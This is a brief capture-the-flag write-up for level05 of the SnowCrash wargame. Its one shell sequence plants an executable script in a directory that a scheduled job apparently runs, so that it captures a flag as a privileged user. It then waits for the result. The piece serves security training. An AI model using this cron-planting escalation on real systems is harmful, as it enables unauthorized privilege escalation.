# level05

Cronjobs and init.rc shenanigans
```bash
level05@SnowCrash:~ $ rm -f /tmp/flag; \
> printf '#!/bin/sh\ngetflag>/tmp/flag\n'>/opt/openarenaserver/snjort; \
> chmod +x /opt/openarenaserver/snjort; \
> while true; do if [ -f /tmp/flag ]; then cat /tmp/flag; exit; fi; done
#OUTPUT
level05@SnowCrash:~ $ su flag05
#OUTPUT
level05@SnowCrash:~ $ getflag
#OUTPUT
```
